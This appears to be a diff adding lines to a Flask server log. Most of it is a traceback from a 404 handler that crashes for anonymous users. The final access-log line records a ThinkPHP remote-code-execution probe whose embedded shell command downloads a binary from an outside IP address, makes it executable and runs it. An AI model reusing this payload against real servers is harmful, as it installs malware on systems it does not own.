+    raise request.routing_exception  # type: ignore[misc]
+  File "/usr/local/lib/python3.11/dist-packages/flask/ctx.py", line 362, in match_request
+    result = self.url_adapter.match(return_rule=True)  # type: ignore
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/werkzeug/routing/map.py", line 629, in match
+    raise NotFound() from None
+werkzeug.exceptions.NotFound: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask_socketio/__init__.py", line 43, in __call__
+    return super(_SocketIOMiddleware, self).__call__(environ,
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/engineio/middleware.py", line 74, in __call__
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1476, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+                                                ^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+                                                ^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 765, in handle_user_exception
+    return self.handle_http_exception(e)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 740, in handle_http_exception
+    return self.ensure_sync(handler)(e)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/spy/spynet/main.py", line 22, in page_not_found
+    if current_user.type == "admin" :
+       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AttributeError: 'AnonymousUserMixin' object has no attribute 'type'
+117.72.13.164 - - [03/Sep/2024 10:01:12] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://193.84.71.195/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
